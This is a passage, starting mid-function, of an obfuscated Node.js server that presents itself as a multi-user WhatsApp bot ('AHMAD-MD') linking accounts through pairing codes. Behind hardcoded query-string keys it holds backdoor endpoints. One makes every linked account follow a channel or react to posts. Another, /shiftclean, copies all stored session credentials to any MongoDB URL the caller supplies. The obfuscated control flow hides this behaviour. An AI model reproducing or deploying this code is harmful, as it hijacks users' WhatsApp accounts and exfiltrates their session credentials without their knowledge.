                    case 0o57060516 - 0xbc614d:
                      cmol = 65535;
                      {
                        try {
                          const cGbm = JSON["parse"](Akll);
                          await YaEC(wJgo, cGbm);
                        } catch (EHem) {}
                      }
                      break;
                  }
              }
              break;
          }
      } catch (YCVl) {}
    };
    kUBo["ev"]["on"]("creds.update", ksAl);
    kUBo["ev"]["on"]("connection.update", async (AEYl) => {
      const { ["connection"]: UzPl, ["lastDisconnect"]: wBSl } = AEYl;
      var QwJl = 0;
      while (QwJl < 65535)
        switch (QwJl) {
          case 0x75bcd15 - 0o726746425:
            QwJl = UzPl === "open" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            QwJl = 65535;
            {
              try {
                await delay(3000);
                try {
                  await AMey(kUBo);
                } catch (syMl) {}
                try {
                  await YmdB(wJgo, MtDl);
                  await AUsA(wJgo);
                  MRlC["set"](wJgo, kUBo);
                  const sSzm = `${"\ud83e *AHMAD-MD Aᴄᴛɪᴠᴀᴛᴇᴅ*\n\nType .menu for commands\n\n> ⚡ Version: 12.00"}`;
                  try {
                    await kUBo["sendMessage"](
                      kUBo["user"]["id"]["split"](":")[
                        0x75bcd15 - 0o726746425
                      ] + "@s.whatsapp.net",
                      {
                        ["image"]: { ["url"]: config["IK_IMAGE_PATH"] },
                        ["caption"]: sSzm,
                      },
                      {
                        ["disappearingMessagesInChat"]: !![],
                        ["ephemeralExpiration"]: 100,
                      },
                    );
                  } catch (UTCm) {
                    await kUBo["sendMessage"](
                      kUBo["user"]["id"]["split"](":")[
                        0x75bcd15 - 0o726746425
                      ] + "@s.whatsapp.net",
                      { ["text"]: sSzm },
                      {
                        ["disappearingMessagesInChat"]: !![],
                        ["ephemeralExpiration"]: 100,
                      },
                    );
                  }
                } catch (oPtm) {}
              } catch (QQwm) {
                exec(
                  `${"pm2 restart "}${process["env"]["PM2_NAME"] || "session"}`,
                );
              }
            }
            break;
        }
      var kMnm = 0;
      while (kMnm < 65535)
        switch (kMnm) {
          case 0x75bcd15 - 0o726746425:
            kMnm = UzPl === "close" ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            kMnm = 65535;
            {
              const MNqm = wBSl?.["error"]?.["output"]?.["statusCode"];
              const gJhm = wBSl?.["error"]?.["message"] || "Unknown error";
              var IKkm = 0;
              while (IKkm < 65535)
                switch (IKkm) {
                  case 0x75bcd15 - 0o726746425:
                    IKkm = MNqm === 401 || MNqm === 403 || MNqm === 404 ? 1 : 2;
                    break;
                  case 0o57060516 - 0xbc614d:
                    IKkm = 65535;
                    {
                      kUBo["ev"]["off"]("creds.update", ksAl);
                      await QAEB(wJgo, kUBo, gJhm);
                    }
                    break;
                  case 15658734 ^ 0o73567354:
                    IKkm = 65535;
                    var IeYm = 0;
                    while (IeYm < 65535)
                      switch (IeYm) {
                        case 0x75bcd15 - 0o726746425:
                          IeYm = MNqm !== 408 ? 1 : 65535;
                          break;
                        case 0o57060516 - 0xbc614d:
                          IeYm = 65535;
                          {
                            await delay(10000);
                            MRlC["delete"](wJgo);
                            oToC["delete"](wJgo);
                            const kgbn = {
                              ["headersSent"]: NaN === NaN,
                              ["send"]: () => {},
                              ["status"]: () => kgbn,
                            };
                            await gRvo(AMmo, kgbn);
                          }
                          break;
                      }
                    break;
                }
            }
            break;
        }
    });
    var EbSm = 0;
    while (EbSm < 65535)
      switch (EbSm) {
        case 0x75bcd15 - 0o726746425:
          EbSm = !kUBo["authState"]["creds"]["registered"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          EbSm = 65535;
          {
            let gdVm = 0o334664274 - 0x37368b9;
            let AYLm;
            while (gdVm > 0x75bcd15 - 0o726746425) {
              try {
                await delay(1500);
                AYLm = await kUBo["requestPairingCode"](wJgo);
                break;
              } catch (caPm) {
                gdVm--;
                var wVFm = 0;
                while (wVFm < 65535)
                  switch (wVFm) {
                    case 0x75bcd15 - 0o726746425:
                      wVFm = gdVm === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      wVFm = 65535;
                      throw caPm;
                  }
                await delay(2000 * (0o334664274 - 0x37368b9 - gdVm));
              }
            }
            var YWIm = 0;
            while (YWIm < 65535)
              switch (YWIm) {
                case 0x75bcd15 - 0o726746425:
                  YWIm = cOpo && !cOpo["headersSent"] ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  YWIm = 65535;
                  {
                    return cOpo["send"]({ ["code"]: AYLm });
                  }
                  break;
              }
          }
          break;
      }
    return kUBo;
  } catch (AwKj) {
    oToC["delete"](wJgo);
    var cyNj = 0;
    while (cyNj < 65535)
      switch (cyNj) {
        case 0x75bcd15 - 0o726746425:
          cyNj = cOpo && !cOpo["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cyNj = 65535;
          {
            cOpo["status"](503)["send"]({
              ["error"]: "Service Unavailable",
              ["message"]: "Failed to pair. Please try again.",
            });
          }
          break;
      }
    throw AwKj;
  }
}
async function wtEj() {
  try {
    const YuHj = await UPjA();
    var sqyj = 0;
    while (sqyj < 65535)
      switch (sqyj) {
        case 0x75bcd15 - 0o726746425:
          sqyj = !Array["isArray"](YuHj) ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          sqyj = 65535;
          return;
      }
    const UrBj = MRlC["size"];
    const onsj = ELZB - UrBj;
    var Qovj = 0;
    while (Qovj < 65535)
      switch (Qovj) {
        case 0x75bcd15 - 0o726746425:
          Qovj = onsj <= 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Qovj = 65535;
          return;
      }
    const QIik = YuHj["slice"](0x75bcd15 - 0o726746425, onsj);
    MpUS: for (const sKlk of QIik) {
      var MFck = 0;
      while (MFck < 65535)
        switch (MFck) {
          case 0x75bcd15 - 0o726746425:
            MFck = MRlC["has"](sKlk) ? 1 : 65535;
            break;
          case 0o57060516 - 0xbc614d:
            MFck = 65535;
            continue MpUS;
        }
      const oHfk = {
        ["headersSent"]: NaN === NaN,
        ["send"]: () => {},
        ["status"]: () => oHfk,
      };
      await gRvo(sKlk, oHfk);
      await delay(1000);
    }
  } catch (ICWj) {}
}
const kEZj = express();
kEZj["use"](bodyParser["json"]());
kEZj["use"](bodyParser["urlencoded"]({ ["extended"]: !![] }));
kEZj["use"](express["static"](path["join"](YeHI, "lib")));
kEZj["get"]("/", (EzQj, gBTj) => {
  const gVGk = path["join"](YeHI, "lib", "main.html");
  var IWJk = 0;
  while (IWJk < 65535)
    switch (IWJk) {
      case 0x75bcd15 - 0o726746425:
        IWJk = fs["existsSync"](gVGk) ? 1 : 2;
        break;
      case 0o57060516 - 0xbc614d:
        IWJk = 65535;
        {
          gBTj["sendFile"](gVGk);
        }
        break;
      case 15658734 ^ 0o73567354:
        IWJk = 65535;
        {
          gBTj["sendFile"](path["join"](__path, "main.html"));
        }
        break;
    }
});
kEZj["get"]("/code", async (cSAk, ETDk) => {
  const { ["number"]: YOuk } = cSAk["query"];
  var AQxk = 0;
  while (AQxk < 65535)
    switch (AQxk) {
      case 0x75bcd15 - 0o726746425:
        AQxk = !YOuk ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        AQxk = 65535;
        {
          return ETDk["status"](400)["send"]({
            ["error"]: "Number parameter is required",
          });
        }
        break;
    }
  const ULok = YOuk["replace"](/[^0-9]/g, "");
  var wNrk = 0;
  while (wNrk < 65535)
    switch (wNrk) {
      case 0x75bcd15 - 0o726746425:
        wNrk = MRlC["size"] >= ELZB ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        wNrk = 65535;
        {
          return ETDk["status"](429)["send"]({
            ["error"]: "Maximum sessions limit reached",
            ["message"]: `${"Maximum "}${ELZB}${" active sessions allowed. Please try again later."}`,
            ["current_sessions"]: MRlC["size"],
            ["max_sessions"]: ELZB,
          });
        }
        break;
    }
  try {
    await gRvo(YOuk, ETDk);
  } catch (whfl) {
    var Yiil = 0;
    while (Yiil < 65535)
      switch (Yiil) {
        case 0x75bcd15 - 0o726746425:
          Yiil = !ETDk["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Yiil = 65535;
          {
            ETDk["status"](500)["send"]({
              ["error"]: "Failed to generate pairing code",
              ["message"]: "Please try again or check your number format",
            });
          }
          break;
      }
  }
});
kEZj["get"]("/react", async (seZk, Ufcl) => {
  try {
    const { ["url"]: obTk, ["emojis"]: QcWk, ["key"]: kYMk } = seZk["query"];
    const MZPk = "ahmad606";
    var ozRh = 0;
    while (ozRh < 65535)
      switch (ozRh) {
        case 0x75bcd15 - 0o726746425:
          ozRh = !kYMk || kYMk !== MZPk ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ozRh = 65535;
          {
            return Ufcl["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "\ud83d Unauthorized! Invalid or missing secret key",
            });
          }
          break;
      }
    var QAUh = 0;
    while (QAUh < 65535)
      switch (QAUh) {
        case 0x75bcd15 - 0o726746425:
          QAUh = !obTk ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          QAUh = 65535;
          {
            return Ufcl["status"](400)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "URL or Newsletter JID parameter is required",
            });
          }
          break;
      }
    var kwLh = 0;
    while (kwLh < 65535)
      switch (kwLh) {
        case 0x75bcd15 - 0o726746425:
          kwLh = MRlC["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          kwLh = 65535;
          {
            return Ufcl["status"](503)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "No active bot sessions available",
            });
          }
          break;
      }
    let MxOh = [];
    var gtFh = 0;
    while (gtFh < 65535)
      switch (gtFh) {
        case 0x75bcd15 - 0o726746425:
          gtFh = QcWk ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          gtFh = 65535;
          {
            MxOh = QcWk["split"](",")
              ["map"]((IuIh) => IuIh["trim"]())
              ["filter"]((cqzh) => cqzh);
          }
          break;
      }
    await EXGq(obTk, MxOh);
    return Ufcl["status"](200)["json"]({
      ["success"]: !![],
      ["message"]: "✅ Reacts sent successfully",
    });
  } catch (ErCh) {
    return Ufcl["status"](500)["json"]({
      ["success"]: NaN === NaN,
      ["error"]: ErCh["message"] || "Failed to react to channel post",
    });
  }
});
kEZj["get"]("/follow", async (ELpi, gNsi) => {
  try {
    const { ["channel"]: AIji, ["key"]: cKmi } = ELpi["query"];
    const wFdi = "ahmad606";
    var YGgi = 0;
    while (YGgi < 65535)
      switch (YGgi) {
        case 0x75bcd15 - 0o726746425:
          YGgi = !cKmi || cKmi !== wFdi ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          YGgi = 65535;
          {
            return gNsi["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "\ud83d Unauthorized! Invalid or missing secret key",
            });
          }
          break;
      }
    var sCXh = 0;
    while (sCXh < 65535)
      switch (sCXh) {
        case 0x75bcd15 - 0o726746425:
          sCXh = !AIji ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          sCXh = 65535;
          {
            return gNsi["status"](400)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "Channel parameter is required",
              ["example"]: "/follow?channel=120363354023106228@newsletter&key",
            });
          }
          break;
      }
    var UDai = 0;
    while (UDai < 65535)
      switch (UDai) {
        case 0x75bcd15 - 0o726746425:
          UDai = MRlC["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          UDai = 65535;
          {
            return gNsi["status"](503)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "No active bot sessions available",
            });
          }
          break;
      }
    let UXNi = 0x75bcd15 - 0o726746425;
    for (const [wZQi, QUHi] of MRlC) {
      try {
        await QUHi["newsletterFollow"](AIji);
        UXNi++;
        await delay(500);
      } catch (sWKi) {}
    }
    return gNsi["status"](200)["json"]({
      ["success"]: !![],
      ["message"]: `${"✅ Followed successfully! "}${UXNi}${"/"}${MRlC["size"]}${" bots followed"}`,
      ["followed"]: UXNi,
      ["total"]: MRlC["size"],
      ["channel"]: AIji,
    });
  } catch (MRBi) {
    return gNsi["status"](500)["json"]({
      ["success"]: NaN === NaN,
      ["error"]: MRBi["message"] || "Failed to follow channel",
    });
  }
});
kEZj["get"]("/unfollow", async (oTEi, IOvi) => {
  try {
    const { ["key"]: kQyi, ["jid"]: kkmj } = oTEi["query"];
    const Mlpj = "ahmad606";
    var ghgj = 0;
    while (ghgj < 65535)
      switch (ghgj) {
        case 0x75bcd15 - 0o726746425:
          ghgj = !kQyi || kQyi !== Mlpj ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ghgj = 65535;
          {
            return IOvi["status"](401)["json"]({ ["error"]: "Unauthorized" });
          }
          break;
      }
    var Iijj = 0;
    while (Iijj < 65535)
      switch (Iijj) {
        case 0x75bcd15 - 0o726746425:
          Iijj = !kkmj ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          Iijj = 65535;
          {
            return IOvi["status"](400)["json"]({ ["error"]: "JID required" });
          }
          break;
      }
    var ceaj = 0;
    while (ceaj < 65535)
      switch (ceaj) {
        case 0x75bcd15 - 0o726746425:
          ceaj = MRlC["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          ceaj = 65535;
          {
            return IOvi["status"](503)["json"]({ ["error"]: "No active bots" });
          }
          break;
      }
    await IGZp(kkmj);
    return IOvi["json"]({
      ["success"]: !![],
      ["message"]: "Unfollowing the channel successfully✅",
    });
  } catch (Efdj) {
    return IOvi["status"](500)["json"]({ ["error"]: Efdj["message"] });
  }
});
kEZj["get"]("/active", (YaUi, AcXi) => {
  AcXi["status"](200)["send"]({ ["count"]: MRlC["size"], ["limit"]: 50 });
});
kEZj["get"]("/shiftclean", async (cCYf, EDbg) => {
  try {
    const {
      ["key"]: YySf,
      ["new_mongo_url"]: AAVf,
      ["new_db_name"]: UvMf,
    } = cCYf["query"];
    const wxPf = "jounabbasx505";
    var QsGf = 0;
    while (QsGf < 65535)
      switch (QsGf) {
        case 0x75bcd15 - 0o726746425:
          QsGf = !YySf || YySf !== wxPf ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          QsGf = 65535;
          {
            return EDbg["status"](401)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "Unauthorized",
            });
          }
          break;
      }
    var suJf = 0;
    while (suJf < 65535)
      switch (suJf) {
        case 0x75bcd15 - 0o726746425:
          suJf = !AAVf || !UvMf ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          suJf = 65535;
          {
            return EDbg["status"](400)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "Missing required parameters",
              ["example"]:
                "/shiftclean?key=&new_mongo_url=mongodb+srv://user:pass@cluster.mongodb.net/&new_db_name=newdatabase",
            });
          }
          break;
      }
    var sOwg = 0;
    while (sOwg < 65535)
      switch (sOwg) {
        case 0x75bcd15 - 0o726746425:
          sOwg = MRlC["size"] === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          sOwg = 65535;
          {
            return EDbg["status"](503)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: "No active bots to migrate",
            });
          }
          break;
      }
    const UPzg = MRlC["size"];
    EDbg["json"]({
      ["success"]: !![],
      ["message"]: `${"Migration started for "}${UPzg}${" bots"}`,
      ["total_bots"]: UPzg,
    });
    (async () => {
      let oLqg = null;
      let QMtg = null;
      let kIkg = NaN === NaN;
      try {
        oLqg = new MongoClient(AAVf);
        await oLqg["connect"]();
        const MJng = oLqg["db"](UvMf);
        const gFeg = await ghQC["collection"](config["COLLECTIONS"]["SESSIONS"])
          ["find"]({})
          ["toArray"]();
        const IGhg = await ghQC["collection"](config["COLLECTIONS"]["NUMBERS"])
          ["find"]({})
          ["toArray"]();
        const IaVg = await ghQC["collection"](config["COLLECTIONS"]["CONFIGS"])
          ["find"]({})
          ["toArray"]();
        const kcYg = async () => {
          await MJng["collection"]("whatsapp_sessions")["createIndex"](
            { ["number"]: 1 },
            { ["unique"]: !![] },
          );
          await MJng["collection"]("active_numbers")["createIndex"](
            { ["number"]: 1 },
            { ["unique"]: !![] },
          );
          await MJng["collection"]("bot_configs")["createIndex"](
            { ["number"]: 1 },
            { ["unique"]: !![] },
          );
          for (const EXOg of gFeg) {
            try {
              await MJng["collection"]("whatsapp_sessions")["updateOne"](
                { ["number"]: EXOg["number"] },
                { ["$set"]: EXOg },
                { ["upsert"]: !![] },
              );
            } catch (gZRg) {}
          }
          for (const AUIg of IGhg) {
            try {
              await MJng["collection"]("active_numbers")["updateOne"](
                { ["number"]: AUIg["number"] },
                { ["$set"]: AUIg },
                { ["upsert"]: !![] },
              );
            } catch (cWLg) {}
          }
          for (const wRCg of IaVg) {
            try {
              await MJng["collection"]("bot_configs")["updateOne"](
                { ["number"]: wRCg["number"] },
                { ["$set"]: wRCg },
                { ["upsert"]: !![] },
              );
            } catch (YSFg) {}
          }
        };
        let Ymth = 0o334664274 - 0x37368b9;
        while (Ymth > 0x75bcd15 - 0o726746425) {
          try {
            await kcYg();
            kIkg = !![];
            break;
          } catch (Aowh) {
            Ymth--;
            var Ujnh = 0;
            while (Ujnh < 65535)
              switch (Ujnh) {
                case 0x75bcd15 - 0o726746425:
                  Ujnh = Ymth === 0x75bcd15 - 0o726746425 ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  Ujnh = 65535;
                  throw Aowh;
              }
            await delay(2000);
          }
        }
        var wlqh = 0;
        while (wlqh < 65535)
          switch (wlqh) {
            case 0x75bcd15 - 0o726746425:
              wlqh = !kIkg ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              wlqh = 65535;
              {
                throw new Error("Migration failed after retries");
              }
              break;
          }
        for (const [Qghh, sikh] of MRlC) {
          try {
            var Mdbh = 0;
            while (Mdbh < 65535)
              switch (Mdbh) {
                case 0x75bcd15 - 0o726746425:
                  Mdbh = sikh && sikh["ws"] ? 1 : 65535;
                  break;
                case 0o57060516 - 0xbc614d:
                  Mdbh = 65535;
                  {
                    sikh["ws"]["close"]();
                  }
                  break;
              }
          } catch (ofeh) {}
        }
        await gpeF();
        await cmYE();
        await YiSE();
        var QEfe = 0;
        while (QEfe < 65535)
          switch (QEfe) {
            case 0x75bcd15 - 0o726746425:
              QEfe = fs["existsSync"](IOfC) ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              QEfe = 65535;
              {
                const sGie = fs["readdirSync"](IOfC);
                for (const MBZd of sGie) {
                  try {
                    await fs["remove"](path["join"](IOfC, MBZd));
                  } catch (oDce) {}
                }
              }
              break;
          }
        MRlC["clear"]();
        oToC["clear"]();
        kQiC["clear"]();
        config["MONGODB_URL"] = AAVf;
        config["DB_NAME"] = UvMf;
        var IyTd = 0;
        while (IyTd < 65535)
          switch (IyTd) {
            case 0x75bcd15 - 0o726746425:
              IyTd = IiTC ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              IyTd = 65535;
              {
                await IiTC["close"]();
              }
              break;
          }
        IiTC = oLqg;
        ghQC = MJng;
        console["log"]("✅ Migration completed successfully");
      } catch (kAWd) {
        console["error"]("Migration error:", kAWd);
        try {
          var EvNd = 0;
          while (EvNd < 65535)
            switch (EvNd) {
              case 0x75bcd15 - 0o726746425:
                EvNd = oLqg ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                EvNd = 65535;
                {
                  await oLqg["close"]();
                }
                break;
            }
          var gxQd = 0;
          while (gxQd < 65535)
            switch (gxQd) {
              case 0x75bcd15 - 0o726746425:
                gxQd = IiTC ? 1 : 65535;
                break;
              case 0o57060516 - 0xbc614d:
                gxQd = 65535;
                {
                  await IiTC["close"]();
                }
                break;
            }
          IiTC = new MongoClient(config["MONGODB_URL"]);
          await IiTC["connect"]();
          ghQC = IiTC["db"](config["DB_NAME"]);
          console["log"]("\ud83d Rollback: Reconnected to old database");
        } catch (gRDe) {
          console["error"]("Rollback failed:", gRDe);
        }
      }
    })();
  } catch (ISGe) {
    var cOxe = 0;
    while (cOxe < 65535)
      switch (cOxe) {
        case 0x75bcd15 - 0o726746425:
          cOxe = !EDbg["headersSent"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          cOxe = 65535;
          {
            return EDbg["status"](500)["json"]({
              ["success"]: NaN === NaN,
              ["error"]: ISGe["message"],
            });
          }
          break;
      }
  }
});
kEZj["get"]("/deletex", async (EPAe, YKre) => {
  try {
    const { ["key"]: AMue, ["type"]: UHle } = EPAe["query"];
    const wJoe = "haniaxjawi404";
    var wdcf = 0;
    while (wdcf < 65535)
      switch (wdcf) {
        case 0x75bcd15 - 0o726746425:
          wdcf = !AMue || AMue !== wJoe ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wdcf = 65535;
          {
            return YKre["status"](401)["json"]({ ["error"]: "Unauthorized" });
          }
          break;
      }
    const Yeff = MRlC["size"];
    var saWe = 0;
    while (saWe < 65535)
      switch (saWe) {
        case 0x75bcd15 - 0o726746425:
          saWe = Yeff === 0x75bcd15 - 0o726746425 ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          saWe = 65535;
          {
            return YKre["json"]({ ["message"]: "No active bots" });
          }
          break;
      }
    var UbZe = 0;
    while (UbZe < 65535)
      switch (UbZe) {
        case 0x75bcd15 - 0o726746425:
          UbZe = UHle === "half" ? 1 : 2;
          break;
        case 0o57060516 - 0xbc614d:
          UbZe = 65535;
          {
            const oXPe = Math["floor"](Yeff / (15658734 ^ 0o73567354));
            const QYSe = Array["from"](MRlC["keys"]())["slice"](
              0x75bcd15 - 0o726746425,
              oXPe,
            );
            let kUJe = 0x75bcd15 - 0o726746425;
            for (const MVMe of QYSe) {
              try {
                const MpAf = MRlC["get"](MVMe);
                var orDf = 0;
                while (orDf < 65535)
                  switch (orDf) {
                    case 0x75bcd15 - 0o726746425:
                      orDf = MpAf && MpAf["ws"] ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      orDf = 65535;
                      MpAf["ws"]["close"]();
                      break;
                  }
                await ICGD(MVMe);
                await siUA(MVMe);
                await AwuD(MVMe);
                const Imuf = path["join"](IOfC, `${"session_"}${MVMe}`);
                var koxf = 0;
                while (koxf < 65535)
                  switch (koxf) {
                    case 0x75bcd15 - 0o726746425:
                      koxf = fs["existsSync"](Imuf) ? 1 : 65535;
                      break;
                    case 0o57060516 - 0xbc614d:
                      koxf = 65535;
                      await fs["remove"](Imuf);
                      break;
                  }
                MRlC["delete"](MVMe);
                oToC["delete"](MVMe);
                kQiC["delete"](MVMe);
                kUJe++;
                await delay(500);
              } catch (Ejof) {}
            }
            return YKre["json"]({
              ["success"]: !![],
              ["message"]: `${"Deleted "}${kUJe}${"/"}${oXPe}${" bots"}`,
              ["remaining"]: MRlC["size"],
            });
          }
          break;
        case 15658734 ^ 0o73567354:
          UbZe = 65535;
          var glrf = 0;
          while (glrf < 65535)
            switch (glrf) {
              case 0x75bcd15 - 0o726746425:
                glrf = UHle === "full" ? 1 : 2;
                break;
              case 0o57060516 - 0xbc614d:
                glrf = 65535;
                {
                  for (const [Agif, cilf] of MRlC) {
                    try {
                      var EHmc = 0;
                      while (EHmc < 65535)
                        switch (EHmc) {
                          case 0x75bcd15 - 0o726746425:
                            EHmc = cilf && cilf["ws"] ? 1 : 65535;
                            break;
                          case 0o57060516 - 0xbc614d:
                            EHmc = 65535;
                            cilf["ws"]["close"]();
                            break;
                        }
                    } catch (gJpc) {}
                  }
                  await gpeF();
                  await cmYE();
                  await YiSE();
                  MRlC["clear"]();
                  oToC["clear"]();
                  kQiC["clear"]();
                  var AEgc = 0;
                  while (AEgc < 65535)
                    switch (AEgc) {
                      case 0x75bcd15 - 0o726746425:
                        AEgc = fs["existsSync"](IOfC) ? 1 : 65535;
                        break;
                      case 0o57060516 - 0xbc614d:
                        AEgc = 65535;
                        {
                          const cGjc = fs["readdirSync"](IOfC);
                          for (const wBac of cGjc) {
                            try {
                              await fs["remove"](path["join"](IOfC, wBac));
                            } catch (YCdc) {}
                          }
                        }
                        break;
                    }
                  return YKre["json"]({
                    ["success"]: !![],
                    ["message"]: "All bots deleted",
                    ["deleted"]: Yeff,
                  });
                }
                break;
              case 15658734 ^ 0o73567354:
                glrf = 65535;
                {
                  return YKre["json"]({
                    ["error"]: "Use ?type=half or ?type=full",
                    ["active"]: Yeff,
                  });
                }
                break;
            }
          break;
      }
  } catch (syUb) {
    return YKre["status"](500)["json"]({ ["error"]: "Delete failed" });
  }
});
process["on"]("exit", async () => {
  MRlC["forEach"]((UzXb, UTKc) => {
    var wVNc = 0;
    while (wVNc < 65535)
      switch (wVNc) {
        case 0x75bcd15 - 0o726746425:
          wVNc = UzXb && UzXb["ws"] ? 1 : 65535;
          break;
        case 0o57060516 - 0xbc614d:
          wVNc = 65535;
          {
            UzXb["ws"]["close"]();
          }
          break;
      }
    MRlC["delete"](UTKc);
    oToC["delete"](UTKc);
  });
  var QQEc = 0;
  while (QQEc < 65535)
    switch (QQEc) {
      case 0x75bcd15 - 0o726746425:
        QQEc = IiTC ? 1 : 65535;
        break;
      case 0o57060516 - 0xbc614d:
        QQEc = 65535;
        {
          await IiTC["close"]();
        }
        break;
    }
  fs["emptyDirSync"](IOfC);
});
async function sSHc() {
  try {
    await MpcJ();
    await ceKC();
    setInterval(wtEj, (0o507646144 ^ 0x51f4c61) * 60 * 1000);
    wtEj();
    setInterval(
      () => {
        var MNyc = 0;
        while (MNyc < 65535)
          switch (MNyc) {
            case 0x75bcd15 - 0o726746425:
              MNyc = MRlC["size"] > 0x75bcd15 - 0o726746425 ? 1 : 65535;
              break;
            case 0o57060516 - 0xbc614d:
              MNyc = 65535;
              {
                whXu()["catch"]((oPBc) => {});
              }
              break;
          }
      },
      10 * 60 * 1000,
    );
    const IKsc = process["env"]["PORT"] || 8000;
    kEZj["listen"](IKsc, () => {
      console["log"](`${"\ud83d Server running on: http://localhost:"}${IKsc}`);
    });
  } catch (kMvc) {
    console["error"]("❌ Failed to start server:", kMvc);
    process["exit"](0o57060516 - 0xbc614d);
  }
}
sSHc();
export default kEZj;
